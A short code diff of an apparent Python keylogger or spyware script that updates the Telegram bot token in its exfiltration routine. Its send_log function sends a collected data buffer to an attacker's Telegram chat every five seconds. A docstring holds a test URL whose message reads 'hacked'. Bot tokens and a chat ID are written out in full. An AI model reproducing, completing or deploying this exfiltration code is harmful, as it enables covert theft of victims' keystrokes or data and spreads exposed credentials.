@@ -1,5 +1,5 @@
 """ 
-https://api.telegram.org/bot5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4/sendMessage?chat_id=921245059&text=hacked
+https://api.telegram.org/bot5818555834:AAGBOPJiR9c4oVlLAfi1eJk2GbsQXmiGJGg/sendMessage?chat_id=921245059&text=hacked
 token (k3tonbot) = 5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4
 chat_id = 921245059
 """
@@ -19,7 +19,7 @@ def send_log():
         global data
         time.sleep(5)
         if data != '':
-            url = f"https://api.telegram.org/bot5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4/sendMessage?chat_id=921245059&text={data}"
+            url = f"https://api.telegram.org/bot5818555834:AAGBOPJiR9c4oVlLAfi1eJk2GbsQXmiGJGg/sendMessage?chat_id=921245059&text={data}"
             requests.get(url)
         data = ''
 
